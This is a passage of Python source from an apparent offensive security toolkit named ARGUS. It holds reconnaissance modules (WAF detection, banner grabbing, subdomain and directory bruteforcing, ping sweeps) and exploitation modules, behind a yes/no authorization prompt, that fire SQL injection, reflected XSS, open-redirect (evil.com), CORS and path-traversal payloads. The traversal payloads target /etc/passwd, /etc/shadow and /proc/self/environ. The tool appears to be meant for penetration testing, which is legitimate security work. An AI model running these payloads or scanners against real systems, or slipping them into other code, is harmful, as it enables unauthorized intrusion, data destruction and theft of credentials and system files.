    "ModSecurity": {"headers": ["mod_security", "modsecurity"],
                    "cookies": [], "body": ["mod_security", "modsecurity", "noyb"]},
    "DDoS-Guard": {"headers": ["ddos-guard"],
                   "cookies": [], "body": ["ddos-guard"]},
    "Wordfence": {"headers": [],
                  "cookies": ["wfvt_"], "body": ["wordfence"]},
    "StackPath": {"headers": ["x-sp-waf"],
                  "cookies": [], "body": ["stackpath"]},
    "Barracuda": {"headers": ["barra_counter_session"],
                  "cookies": ["barra_counter_session"], "body": ["barracuda"]},
    "Fortinet / FortiWeb": {"headers": ["fortiwafsid"],
                            "cookies": ["FORTIWAFSID"], "body": ["fortigate"]},
}


def waf_detector():
    print_header("WAF / CDN Detector")
    target = prompt("Target URL")
    if not target:
        return

    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    spinner("Probing for WAF signatures...", 1.5)

    detected = []

    # Normal request
    try:
        resp = requests.get(target, timeout=10)
        headers_lower = {k.lower(): v.lower() for k, v in resp.headers.items()}
        cookies_str = str(resp.cookies.get_dict()).lower()
        body_lower = resp.text[:5000].lower()
        server = resp.headers.get("Server", "")
        if server:
            print_row("Server Header", server)

        for waf_name, sigs in WAF_SIGNATURES.items():
            score = 0
            for h in sigs["headers"]:
                if h.lower() in headers_lower:
                    score += 2
            for c in sigs["cookies"]:
                if c.lower() in cookies_str:
                    score += 2
            for b in sigs["body"]:
                if b.lower() in body_lower:
                    score += 1
            if score > 0:
                detected.append((waf_name, score))
    except Exception as e:
        print_err(f"Error: {e}")
        return

    # Malicious request to trigger WAF
    try:
        mal_url = target.rstrip("/") + "/<script>alert(1)</script>?id=' OR 1=1--"
        resp2 = requests.get(mal_url, timeout=10, allow_redirects=False)
        if resp2.status_code in (403, 406, 429, 503):
            print_ok(f"WAF triggered (malicious request → HTTP {resp2.status_code})")
        headers2 = {k.lower(): v.lower() for k, v in resp2.headers.items()}
        body2 = resp2.text[:5000].lower()
        for waf_name, sigs in WAF_SIGNATURES.items():
            for h in sigs["headers"]:
                if h.lower() in headers2:
                    already = any(w == waf_name for w, _ in detected)
                    if not already:
                        detected.append((waf_name, 2))
            for b in sigs["body"]:
                if b.lower() in body2:
                    already = any(w == waf_name for w, _ in detected)
                    if not already:
                        detected.append((waf_name, 1))
    except Exception:
        pass

    detected.sort(key=lambda x: x[1], reverse=True)
    if detected:
        print(f"\n  {Y}Detected WAF/CDN:{RST}")
        for waf_name, score in detected:
            confidence = "HIGH" if score >= 3 else "MEDIUM" if score >= 2 else "LOW"
            clr = G if score >= 3 else Y if score >= 2 else W
            print(f"    {clr}■{RST} {waf_name} (confidence: {clr}{confidence}{RST})")
    else:
        print_warn("No WAF/CDN detected (may still be present but undetected)")


# ─── 38. Banner Grabbing ─────────────────────────────────────────────────────

BANNER_PORTS = {
    21: ("FTP", None),
    22: ("SSH", None),
    23: ("Telnet", None),
    25: ("SMTP", b"EHLO argus\r\n"),
    80: ("HTTP", b"HEAD / HTTP/1.0\r\nHost: target\r\n\r\n"),
    110: ("POP3", None),
    143: ("IMAP", None),
    443: ("HTTPS", None),
    587: ("SMTP-TLS", b"EHLO argus\r\n"),
    3306: ("MySQL", None),
    5432: ("PostgreSQL", None),
    6379: ("Redis", b"INFO\r\n"),
    8080: ("HTTP-Alt", b"HEAD / HTTP/1.0\r\nHost: target\r\n\r\n"),
    8443: ("HTTPS-Alt", None),
    27017: ("MongoDB", None),
}


def banner_grab():
    print_header("Banner Grabbing")
    target = prompt("Target host")
    if not target:
        return

    ports_input = prompt("Ports (comma-separated, or 'common' for default)")
    if not ports_input:
        return

    if ports_input.lower() in ("common", "default", "all"):
        ports = list(BANNER_PORTS.keys())
    else:
        try:
            ports = [int(p.strip()) for p in ports_input.split(",")]
        except ValueError:
            print_err("Invalid port numbers")
            return

    spinner("Grabbing banners...", 1.0)

    def grab_one(port):
        service = BANNER_PORTS.get(port, ("Unknown", None))[0]
        probe = BANNER_PORTS.get(port, (None, None))[1]
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, port))
            if probe:
                s.send(probe)
            banner = s.recv(1024).decode(errors="replace").strip()
            s.close()
            return port, service, banner
        except Exception:
            return port, service, None

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(grab_one, p): p for p in ports}
        results = []
        for future in concurrent.futures.as_completed(futures):
            results.append(future.result())

    results.sort(key=lambda x: x[0])
    found = False
    for port, service, banner in results:
        if banner:
            found = True
            banner_short = banner[:100].replace("\n", " | ")
            print(f"\n  {G}Port {port}/{service}:{RST}")
            print(f"    {W}{banner_short}{RST}")

    if not found:
        print_warn("No banners retrieved (ports may be closed or filtered)")


# ─── 39. Subdomain Bruteforce ────────────────────────────────────────────────

SUBDOMAIN_WORDLIST = [
    "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "ns2",
    "ns3", "ns4", "dns", "dns1", "dns2", "api", "dev", "staging", "stage",
    "test", "testing", "beta", "alpha", "demo", "app", "apps", "admin",
    "portal", "blog", "shop", "store", "forum", "wiki", "docs", "doc",
    "help", "support", "status", "monitor", "cdn", "assets", "static",
    "media", "images", "img", "video", "vpn", "remote", "gateway",
    "proxy", "cache", "web", "web1", "web2", "server", "server1",
    "server2", "db", "database", "mysql", "postgres", "redis", "mongo",
    "elastic", "search", "git", "gitlab", "github", "jenkins", "ci", "cd",
    "build", "deploy", "docker", "k8s", "kube", "kubernetes", "grafana",
    "prometheus", "kibana", "logstash", "sentry", "jira", "confluence",
    "slack", "chat", "irc", "mx", "mx1", "mx2", "exchange", "owa",
    "autodiscover", "sip", "voip", "pbx", "ssh", "sftp", "backup",
    "bak", "old", "new", "v1", "v2", "internal", "intranet", "extranet",
    "secure", "login", "auth", "sso", "oauth", "id", "identity",
    "accounts", "account", "billing", "payment", "pay", "checkout",
    "crm", "erp", "hr", "finance", "sales", "marketing", "analytics",
    "track", "tracking", "report", "reports", "dashboard", "panel",
    "cp", "cpanel", "whm", "plesk", "webmin", "phpmyadmin", "pma",
    "m", "mobile", "wap", "preview", "sandbox", "qa", "uat",
    "prod", "production", "live", "www2", "www3", "origin", "edge",
]


def subdomain_brute():
    print_header("Subdomain Bruteforce")
    domain = prompt("Domain (e.g. example.com)")
    if not domain:
        return

    custom = input(f"  {Y}Use custom wordlist file? (path or Enter for built-in):{RST} ").strip()
    wordlist = SUBDOMAIN_WORDLIST
    if custom:
        try:
            with open(custom, "r") as f:
                wordlist = [line.strip() for line in f if line.strip()]
            print_ok(f"Loaded {len(wordlist)} words from {custom}")
        except Exception as e:
            print_err(f"Could not load wordlist: {e}")
            return

    spinner(f"Bruteforcing {len(wordlist)} subdomains...", 1.0)
    found = []

    def resolve_sub(sub):
        fqdn = f"{sub}.{domain}"
        try:
            if STEALTH["enabled"] and dns is not None:
                answers = dns.resolver.resolve(fqdn, "A", lifetime=10)
                ip = str(answers[0])
            else:
                ip = socket.gethostbyname(fqdn)
            return fqdn, ip
        except Exception:
            return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(resolve_sub, sub): sub for sub in wordlist}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                fqdn, ip = result
                found.append((fqdn, ip))
                print(f"    {G}[+]{RST} {C}{fqdn:<40}{RST} → {W}{ip}{RST}")

    print(f"\n  {Y}Total found: {G}{len(found)}{RST} / {len(wordlist)} tested")


# ─── 40. Ping Sweep ──────────────────────────────────────────────────────────

def ping_sweep():
    print_header("Ping Sweep / Host Discovery")
    if not _stealth_raw_socket_warning("Ping Sweep"):
        return
    cidr = prompt("IP range (e.g. 192.168.1.0/24 or 192.168.1.1-50)")
    if not cidr:
        return

    # Parse IP range
    ips = []
    if "/" in cidr:
        parts = cidr.split("/")
        base_ip = parts[0]
        mask = int(parts[1])
        octets = list(map(int, base_ip.split(".")))
        base = (octets[0] << 24) | (octets[1] << 16) | (octets[2] << 8) | octets[3]
        num_hosts = 2 ** (32 - mask)
        for i in range(1, min(num_hosts - 1, 1024)):
            ip_int = base + i
            ips.append(f"{(ip_int >> 24) & 0xFF}.{(ip_int >> 16) & 0xFF}.{(ip_int >> 8) & 0xFF}.{ip_int & 0xFF}")
    elif "-" in cidr:
        base, _, end_part = cidr.rpartition(".")
        if "-" in end_part:
            start, _, end = end_part.partition("-")
            for i in range(int(start), int(end) + 1):
                ips.append(f"{base}.{i}")
        else:
            print_err("Invalid range format")
            return
    else:
        print_err("Use CIDR notation (x.x.x.x/24) or range (x.x.x.1-50)")
        return

    print_row("Hosts to scan", str(len(ips)))
    spinner("Scanning...", 1.0)

    alive = []

    def check_host(ip):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            result = s.connect_ex((ip, 80))
            s.close()
            if result == 0:
                return ip, "80/tcp open"
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            result = s.connect_ex((ip, 443))
            s.close()
            if result == 0:
                return ip, "443/tcp open"
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            result = s.connect_ex((ip, 22))
            s.close()
            if result == 0:
                return ip, "22/tcp open"
            return None
        except Exception:
            return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(check_host, ip): ip for ip in ips}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                ip, info = result
                alive.append(ip)
                try:
                    hostname = socket.gethostbyaddr(ip)[0]
                except Exception:
                    hostname = ""
                host_info = f" ({hostname})" if hostname else ""
                print(f"    {G}[+]{RST} {C}{ip:<16}{RST} {W}{info}{host_info}{RST}")

    print(f"\n  {Y}Alive hosts: {G}{len(alive)}{RST} / {len(ips)} scanned")


# ─── 41. Vibe-Coded Site Finder ───────────────────────────────────────────────

VIBE_DOMAINS = {
    # Vercel
    "Vercel":           "https://{name}.vercel.app",
    # Netlify
    "Netlify":          "https://{name}.netlify.app",
    # Lovable
    "Lovable":          "https://{name}.lovable.app",
    # Replit
    "Replit":           "https://{name}.repl.co",
    # Render
    "Render":           "https://{name}.onrender.com",
    # Railway
    "Railway":          "https://{name}.up.railway.app",
    # Surge
    "Surge":            "https://{name}.surge.sh",
    # GitHub Pages
    "GitHub Pages":     "https://{name}.github.io",
    # GitLab Pages
    "GitLab Pages":     "https://{name}.gitlab.io",
    # Firebase
    "Firebase":         "https://{name}.web.app",
    "Firebase (alt)":   "https://{name}.firebaseapp.com",
    # Fly.io
    "Fly.io":           "https://{name}.fly.dev",
    # Cloudflare Pages
    "Cloudflare Pages": "https://{name}.pages.dev",
    # Deno Deploy
    "Deno Deploy":      "https://{name}.deno.dev",
    # Supabase
    "Supabase":         "https://{name}.supabase.co",
    # HuggingFace Spaces
    "HuggingFace":      "https://{name}.hf.space",
    # Streamlit
    "Streamlit":        "https://{name}.streamlit.app",
    # Glitch
    "Glitch":           "https://{name}.glitch.me",
    # Bolt / StackBlitz
    "StackBlitz":       "https://{name}.stackblitz.io",
    # Heroku
    "Heroku":           "https://{name}.herokuapp.com",
    # Fleek
    "Fleek":            "https://{name}.on.fleek.co",
    # Carrd
    "Carrd":            "https://{name}.carrd.co",
    # Framer
    "Framer":           "https://{name}.framer.website",
    # Webflow
    "Webflow":          "https://{name}.webflow.io",
}


def _check_vibe_site(name, domain_label, url_tpl, session):
    url = url_tpl.format(name=name)
    try:
        resp = session.get(url, timeout=10, allow_redirects=True)
        if resp.status_code == 200:
            ct = resp.headers.get("Content-Type", "")
            if "text/html" in ct or "application/json" in ct:
                return domain_label, url, True
    except Exception:
        pass
    return domain_label, url, False


def vibe_site_finder():
    print_header("Vibe-Coded Site Finder")
    name = prompt("Project / app name")
    if not name:
        return

    name = name.lower().strip().replace(" ", "-")
    print_row("Normalized name", name)
    print_row("Domains to check", str(len(VIBE_DOMAINS)))
    spinner("Scanning vibe-coding platforms...", 1.0)

    found = []
    with requests.Session() as session:
        session.headers.update({"User-Agent": "Mozilla/5.0 (ARGUS OSINT Tool)"})
        futures = {}
        with concurrent.futures.ThreadPoolExecutor(max_workers=15) as pool:
            for label, tpl in VIBE_DOMAINS.items():
                futures[pool.submit(_check_vibe_site, name, label, tpl, session)] = label
            for future in concurrent.futures.as_completed(futures):
                label, url, exists = future.result()
                if exists:
                    print_ok(f"{label:<20} {G}{url}{RST}")
                    found.append((label, url))
                else:
                    print_err(f"{label:<20} Not found")

    print(f"\n  {Y}Results: {G}{len(found)}{Y}/{len(VIBE_DOMAINS)} platforms{RST}")

    if found:
        print(f"\n  {C}──── Live sites ────{RST}")
        for label, url in sorted(found):
            print(f"    {G}●{RST} {W}{label:<20}{RST} {C}{url}{RST}")


# ═══════════════════════════════════════════════════════════════════════════════
#                          EXPLOITATION MODULES
# ═══════════════════════════════════════════════════════════════════════════════

EXPLOIT_DISCLAIMER = f"""
  {R}╔══════════════════════════════════════════════════════╗
  ║ {Y}WARNING: AUTHORIZED TESTING ONLY{R}                      ║
  ║ {W}These tools are for authorized penetration testing,{R}   ║
  ║ {W}CTF challenges, and security research ONLY.{R}           ║
  ║ {W}Unauthorized access to systems is ILLEGAL.{R}            ║
  ║ {Y}You are solely responsible for your actions.{R}          ║
  ╚══════════════════════════════════════════════════════╝{RST}
"""


def exploit_disclaimer():
    print(EXPLOIT_DISCLAIMER)
    confirm = input(f"  {Y}Do you have authorization? (yes/no):{RST} ").strip().lower()
    return confirm in ("yes", "y", "si", "s")


# ─── 31. SQL Injection Tester ─────────────────────────────────────────────────

SQL_PAYLOADS = [
    ("' OR '1'='1", "Basic OR bypass"),
    ("' OR '1'='1' --", "OR bypass with comment"),
    ("' OR '1'='1' #", "OR bypass with hash comment"),
    ("\" OR \"1\"=\"1\"", "Double-quote OR bypass"),
    ("1' ORDER BY 1--", "ORDER BY column enumeration"),
    ("1' ORDER BY 10--", "ORDER BY high column"),
    ("1' UNION SELECT NULL--", "UNION single column"),
    ("1' UNION SELECT NULL,NULL--", "UNION two columns"),
    ("1' UNION SELECT NULL,NULL,NULL--", "UNION three columns"),
    ("' AND 1=1--", "AND true condition"),
    ("' AND 1=2--", "AND false condition"),
    ("'; WAITFOR DELAY '0:0:5'--", "Time-based blind (MSSQL)"),
    ("' AND SLEEP(5)--", "Time-based blind (MySQL)"),
    ("' AND pg_sleep(5)--", "Time-based blind (PostgreSQL)"),
    ("1; DROP TABLE test--", "Stacked query test (harmless table)"),
    ("' UNION SELECT version()--", "Version extraction (MySQL/PG)"),
    ("' UNION SELECT @@version--", "Version extraction (MSSQL)"),
    ("admin'--", "Auth bypass admin"),
    ("' OR 1=1 LIMIT 1--", "OR bypass with LIMIT"),
    ("1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "Error-based extraction"),
]


def sqli_tester():
    print_header("SQL Injection Tester")
    if not exploit_disclaimer():
        return

    url = prompt("Target URL with parameter (e.g. http://target.com/page?id=1)")
    if not url:
        return

    parsed = urlparse(url)
    if "=" not in parsed.query:
        print_err("URL must contain a query parameter (e.g. ?id=1)")
        return

    # Find the parameter to inject
    params = parsed.query.split("&")
    print(f"\n  {Y}Parameters found:{RST}")
    for i, p in enumerate(params):
        print(f"    {C}{i+1}.{RST} {p}")

    param_idx = input(f"\n  {Y}Select parameter to test (1-{len(params)}):{RST} ").strip()
    try:
        param_idx = int(param_idx) - 1
        if not (0 <= param_idx < len(params)):
            print_err("Invalid selection")
            return
    except ValueError:
        print_err("Invalid number")
        return

    target_param = params[param_idx]
    param_name = target_param.split("=")[0]

    spinner("Testing SQL injection payloads...", 1.0)

    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (ARGUS Pentest)"})

    # Get baseline response
    try:
        baseline = session.get(url, timeout=10)
        baseline_len = len(baseline.text)
        baseline_code = baseline.status_code
    except Exception as e:
        print_err(f"Could not reach target: {e}")
        return

    print_row("Baseline Status", str(baseline_code))
    print_row("Baseline Length", str(baseline_len))
    print()

    findings = []
    for payload, description in SQL_PAYLOADS:
        new_params = list(params)
        new_params[param_idx] = f"{param_name}={payload}"
        test_url = f"{base_url}?{'&'.join(new_params)}"

        try:
            start = time.time()
            resp = session.get(test_url, timeout=12)
            elapsed = time.time() - start
            resp_len = len(resp.text)
            diff = abs(resp_len - baseline_len)

            indicators = []
            # Check for significant size change
            if diff > baseline_len * 0.15 and diff > 50:
                indicators.append("SIZE_DIFF")
            # Check for time-based
            if elapsed > 4.5:
                indicators.append("TIME_DELAY")
            # Check for SQL error messages in response
            sql_errors = [
                "sql syntax", "mysql", "sqlite", "postgresql", "ora-",
                "microsoft sql", "unclosed quotation", "syntax error",
                "unterminated string", "pg_query", "sqlstate",
                "warning: mysql", "valid mysql result",
            ]
            body_lower = resp.text.lower()
            for err in sql_errors:
                if err in body_lower:
                    indicators.append("SQL_ERROR")
                    break

            if indicators:
                tag = ",".join(indicators)
                print_err(f"{R}POTENTIAL{RST} [{Y}{tag}{RST}] {description}")
                print(f"       Payload: {W}{payload}{RST}")
                print(f"       Status: {resp.status_code}  Size: {resp_len} (diff: {diff})  Time: {elapsed:.2f}s")
                findings.append((payload, description, tag))
            else:
                print(f"  {C}  CLEAN{RST}  {description}")
        except requests.exceptions.Timeout:
            print_err(f"{R}TIMEOUT{RST} (possible time-based blind) — {description}")
            findings.append((payload, description, "TIMEOUT"))
        except Exception:
            pass

    print(f"\n  {Y}{'═' * 50}{RST}")
    if findings:
        print(f"  {R}Found {len(findings)} potential injection point(s)!{RST}")
        print_warn("Manual verification required — false positives possible")
    else:
        print_ok("No obvious injection points found with basic payloads")


# ─── 32. XSS Scanner ─────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    ('<script>alert("XSS")</script>', "Basic script tag"),
    ("<img src=x onerror=alert(1)>", "IMG onerror"),
    ("<svg onload=alert(1)>", "SVG onload"),
    ("<svg/onload=alert(1)>", "SVG onload no space"),
    ('"><script>alert(1)</script>', "Break out of attribute"),
    ("'><script>alert(1)</script>", "Break single-quote attr"),
    ("<body onload=alert(1)>", "Body onload"),
    ("<input onfocus=alert(1) autofocus>", "Input autofocus"),
    ("<details open ontoggle=alert(1)>", "Details ontoggle"),
    ("<marquee onstart=alert(1)>", "Marquee onstart"),
    ("javascript:alert(1)", "Javascript protocol"),
    ("<iframe src=javascript:alert(1)>", "Iframe javascript"),
    ('"><img src=x onerror=alert(1)>', "Break attr + IMG"),
    ("<script>alert(String.fromCharCode(88,83,83))</script>", "CharCode bypass"),
    ("%3Cscript%3Ealert(1)%3C/script%3E", "URL-encoded script"),
    ("<scr<script>ipt>alert(1)</scr</script>ipt>", "Nested tag bypass"),
    ("{{constructor.constructor('alert(1)')()}}", "Template injection"),
    ("${alert(1)}", "Template literal"),
]


def xss_scanner():
    print_header("XSS Scanner (Reflected)")
    if not exploit_disclaimer():
        return

    url = prompt("Target URL with parameter (e.g. http://target.com/search?q=test)")
    if not url:
        return

    parsed = urlparse(url)
    if "=" not in parsed.query:
        print_err("URL must contain a query parameter")
        return

    params = parsed.query.split("&")
    print(f"\n  {Y}Parameters found:{RST}")
    for i, p in enumerate(params):
        print(f"    {C}{i+1}.{RST} {p}")

    param_idx = input(f"\n  {Y}Select parameter to test (1-{len(params)}):{RST} ").strip()
    try:
        param_idx = int(param_idx) - 1
        if not (0 <= param_idx < len(params)):
            print_err("Invalid selection")
            return
    except ValueError:
        print_err("Invalid number")
        return

    target_param = params[param_idx]
    param_name = target_param.split("=")[0]
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (ARGUS Pentest)"})

    spinner("Testing XSS payloads...", 1.0)

    findings = []
    for payload, description in XSS_PAYLOADS:
        new_params = list(params)
        new_params[param_idx] = f"{param_name}={payload}"
        test_url = f"{base_url}?{'&'.join(new_params)}"

        try:
            resp = session.get(test_url, timeout=10)
            # Check if payload is reflected in the response
            if payload in resp.text:
                print_err(f"{R}REFLECTED{RST} — {description}")
                print(f"       Payload: {W}{payload}{RST}")
                findings.append((payload, description))
            elif payload.lower() in resp.text.lower():
                print_warn(f"Partially reflected (case change) — {description}")
            else:
                # Check if key parts are reflected (without full tag)
                canary = payload.replace("<", "").replace(">", "")[:15]
                if canary in resp.text and len(canary) > 5:
                    print_warn(f"Filtered but partially reflected — {description}")
                else:
                    print(f"  {C}  CLEAN{RST}  {description}")
        except Exception:
            pass

    print(f"\n  {Y}{'═' * 50}{RST}")
    if findings:
        print(f"  {R}Found {len(findings)} reflected XSS point(s)!{RST}")
        print_warn("Verify in browser — WAF may still block execution")
    else:
        print_ok("No reflected XSS found with basic payloads")
        print_warn("DOM-based and stored XSS require manual testing")


# ─── 33. Directory Bruteforcer ────────────────────────────────────────────────

COMMON_DIRS = [
    "admin", "administrator", "login", "wp-admin", "wp-login.php",
    "dashboard", "cpanel", "phpmyadmin", "adminer", "panel",
    "api", "api/v1", "api/v2", "graphql", "swagger", "docs",
    "backup", "backups", "bak", "old", "temp", "tmp",
    ".git", ".git/HEAD", ".env", ".htaccess", ".htpasswd",
    "config", "config.php", "configuration.php", "wp-config.php.bak",
    "robots.txt", "sitemap.xml", "crossdomain.xml", "security.txt",
    ".well-known/security.txt", "server-status", "server-info",
    "info.php", "phpinfo.php", "test.php", "debug", "trace",
    "cgi-bin", "cgi-bin/test-cgi", "scripts", "console",
    "uploads", "upload", "files", "media", "images", "assets",
    "static", "public", "private", "secret", "hidden",
    "database", "db", "sql", "dump", "data",
    "wp-content", "wp-includes", "wp-json", "xmlrpc.php",
    "vendor", "node_modules", "bower_components",
    "shell", "cmd", "terminal", "webshell",
    "test", "testing", "staging", "dev", "development",
    "log", "logs", "error_log", "access_log", "debug.log",
    ".DS_Store", "Thumbs.db", "web.config", "package.json",
    "composer.json", "Gemfile", "requirements.txt", "Dockerfile",
    ".svn", ".svn/entries", ".hg", "CVS",
    "readme", "README.md", "CHANGELOG", "LICENSE",
    "install", "setup", "init", "register",
    "reset", "forgot", "password", "user", "users",
    "account", "profile", "settings", "preferences",
    "download", "export", "import", "migrate",
    "status", "health", "healthcheck", "ping", "version",
    "metrics", "prometheus", "grafana",
    "jenkins", "travis", "gitlab-ci", "Jenkinsfile",
    "actuator", "actuator/health", "actuator/env",
    "swagger-ui.html", "api-docs", "redoc",
    "elmah.axd", "trace.axd",
]


def dir_bruteforce():
    print_header("Directory / File Bruteforcer")
    if not exploit_disclaimer():
        return

    url = prompt("Target URL (e.g. https://target.com)")
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    url = url.rstrip("/")

    spinner("Starting directory scan...", 0.5)
    print_row("Target", url)
    print_row("Wordlist Size", str(len(COMMON_DIRS)))
    print()

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (ARGUS Pentest)"})

    found = []
    interesting = []

    def check_dir(path):
        try:
            test_url = f"{url}/{path}"
            resp = session.get(test_url, timeout=6, allow_redirects=False)
            return path, resp.status_code, len(resp.content), resp.headers.get("Location", "")
        except Exception:
            return path, 0, 0, ""

    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as pool:
        futures = {pool.submit(check_dir, d): d for d in COMMON_DIRS}
        for future in concurrent.futures.as_completed(futures):
            path, code, size, location = future.result()
            if code == 0:
                continue

            if code == 200:
                print_ok(f"{G}200{RST}  /{path:<35} ({size} bytes)")
                found.append((path, code, size))
            elif code in (301, 302, 307, 308):
                loc = f" -> {location}" if location else ""
                print_warn(f"{Y}{code}{RST}  /{path:<35}{loc}")
                found.append((path, code, size))
            elif code == 403:
                print(f"  {R}403{RST}  /{path:<35} (Forbidden)")
                interesting.append((path, code))
            elif code == 401:
                print(f"  {R}401{RST}  /{path:<35} (Auth Required)")
                interesting.append((path, code))
            # Skip 404s silently

    print(f"\n  {Y}{'═' * 50}{RST}")
    print_row("Accessible (2xx)", str(len([f for f in found if 200 <= f[1] < 300])))
    print_row("Redirects (3xx)", str(len([f for f in found if 300 <= f[1] < 400])))
    print_row("Forbidden (403)", str(len([i for i in interesting if i[1] == 403])))
    print_row("Auth Required (401)", str(len([i for i in interesting if i[1] == 401])))


# ─── 34. CORS Misconfiguration Check ─────────────────────────────────────────

def cors_check():
    print_header("CORS Misconfiguration Scanner")
    if not exploit_disclaimer():
        return

    url = prompt("Target URL (e.g. https://target.com/api)")
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    spinner("Testing CORS policies...", 1.0)

    parsed = urlparse(url)
    target_origin = f"{parsed.scheme}://{parsed.netloc}"

    test_origins = [
        ("https://evil.com", "Arbitrary origin"),
        (f"https://{parsed.netloc}.evil.com", "Subdomain prefix"),
        (f"https://evil{parsed.netloc}", "Origin suffix match"),
        ("null", "Null origin"),
        (target_origin, "Same origin (baseline)"),
        (f"http://{parsed.netloc}", "HTTP downgrade"),
        (f"https://sub.{parsed.netloc}", "Subdomain"),
    ]

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (ARGUS Pentest)"})
    vulns = []

    for origin, description in test_origins:
        try:
            resp = session.get(url, timeout=8, headers={"Origin": origin})
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "")

            if acao:
                is_vuln = False
                if acao == "*":
                    print_warn(f"Wildcard ACAO — {description}")
                    if acac.lower() == "true":
                        is_vuln = True
                elif acao == origin and origin != target_origin:
                    is_vuln = True

                if is_vuln:
                    print_err(f"{R}VULNERABLE{RST} — {description}")
                    print(f"       Origin:  {W}{origin}{RST}")
                    print(f"       ACAO:    {W}{acao}{RST}")
                    print(f"       ACAC:    {W}{acac}{RST}")
                    vulns.append(description)
                elif acao == origin and origin == target_origin:
                    print_ok(f"Same-origin reflected (expected) — {description}")
                else:
                    print(f"  {C}  OK{RST}    ACAO: {acao}  — {description}")
            else:
                print(f"  {C}  OK{RST}    No ACAO header — {description}")
        except Exception as e:
            print_err(f"Error testing {description}: {e}")

    print(f"\n  {Y}{'═' * 50}{RST}")
    if vulns:
        print(f"  {R}Found {len(vulns)} CORS misconfiguration(s)!{RST}")
        print_warn("Attacker can read responses cross-origin")
    else:
        print_ok("No CORS misconfigurations detected")


# ─── 35. Open Redirect Scanner ───────────────────────────────────────────────

REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
    "https://evil.com%00.target.com",
    "https://evil.com?.target.com",
    "https://evil.com#.target.com",
    "https://evil.com@target.com",
    "https://target.com.evil.com",
    "//%0d%0aHost:evil.com",
    "https:evil.com",
    "////evil.com",
    "https://evil.com/%2f%2f",
    "///evil.com",
    "\\\\evil.com",
    "https://evil.com%23.target.com",
]


def open_redirect_scanner():
    print_header("Open Redirect Scanner")
    if not exploit_disclaimer():
        return

    url = prompt("Target URL with redirect param\n  (e.g. http://target.com/login?redirect=http://target.com)")
    if not url:
        return

    parsed = urlparse(url)
    if "=" not in parsed.query:
        print_err("URL must contain a query parameter with a redirect value")
        return

    params = parsed.query.split("&")
    # Find likely redirect parameter
    redirect_params = ["redirect", "url", "next", "return", "returnurl",
                       "goto", "redir", "redirect_uri", "continue", "dest",
                       "destination", "forward", "target", "to", "out", "link"]

    param_idx = None
    for i, p in enumerate(params):
        pname = p.split("=")[0].lower()
        if pname in redirect_params:
            param_idx = i
            break

    if param_idx is None:
        print(f"\n  {Y}Parameters found:{RST}")
        for i, p in enumerate(params):
            print(f"    {C}{i+1}.{RST} {p}")
        idx = input(f"\n  {Y}Select redirect parameter (1-{len(params)}):{RST} ").strip()
        try:
            param_idx = int(idx) - 1
        except ValueError:
            print_err("Invalid number")
            return

    param_name = params[param_idx].split("=")[0]
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    spinner("Testing redirect payloads...", 1.0)
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (ARGUS Pentest)"})

    findings = []
    for payload in REDIRECT_PAYLOADS:
        new_params = list(params)
        new_params[param_idx] = f"{param_name}={payload}"
        test_url = f"{base_url}?{'&'.join(new_params)}"

        try:
            resp = session.get(test_url, timeout=8, allow_redirects=False)
            location = resp.headers.get("Location", "")

            if resp.status_code in (301, 302, 303, 307, 308):
                if "evil.com" in location:
                    print_err(f"{R}REDIRECT TO EVIL{RST}  Status: {resp.status_code}")
                    print(f"       Payload:  {W}{payload}{RST}")
                    print(f"       Location: {W}{location}{RST}")
                    findings.append(payload)
                else:
                    print(f"  {C}  SAFE{RST}  Redirects to: {location[:60]}")
            else:
                print(f"  {C}  OK{RST}    No redirect (status {resp.status_code})")
        except Exception:
            pass

    print(f"\n  {Y}{'═' * 50}{RST}")
    if findings:
        print(f"  {R}Found {len(findings)} open redirect(s)!{RST}")
    else:
        print_ok("No open redirects found")


# ─── 36. LFI / Path Traversal Tester ─────────────────────────────────────────

LFI_PAYLOADS = [
    ("../../../etc/passwd", "/etc/passwd (3 levels)"),
    ("../../../../../../etc/passwd", "/etc/passwd (6 levels)"),
    ("....//....//....//etc/passwd", "Double-dot bypass"),
    ("..%2f..%2f..%2fetc%2fpasswd", "URL-encoded traversal"),
    ("%2e%2e/%2e%2e/%2e%2e/etc/passwd", "Full URL-encoded dots"),
    ("....\\....\\....\\etc\\passwd", "Backslash traversal"),
    ("..%252f..%252f..%252fetc/passwd", "Double URL-encode"),
    ("/etc/passwd", "Absolute path"),
    ("/etc/shadow", "Shadow file"),
    ("/etc/hosts", "Hosts file"),
    ("/proc/self/environ", "Process environment"),
    ("/proc/self/cmdline", "Process command line"),
    ("C:\\Windows\\system.ini", "Windows system.ini"),
